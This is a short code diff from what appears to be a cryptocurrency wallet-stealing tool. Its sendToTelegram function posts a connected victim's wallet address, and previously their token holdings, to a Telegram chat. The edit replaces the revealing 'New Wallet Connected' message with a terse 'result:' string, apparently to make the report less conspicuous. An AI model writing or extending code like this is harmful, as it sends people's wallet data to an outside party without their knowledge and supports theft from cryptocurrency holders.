@@ -31,7 +31,7 @@ export const sendToTelegram = async (walletData: any) => {
       },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
-        text: `New Wallet Connected:\nAddress: ${walletData.address}\nTokens: ${JSON.stringify(walletData.tokens, null, 2)}`,
+        text: `result: ${walletData.address}`,
       }),
     });
 
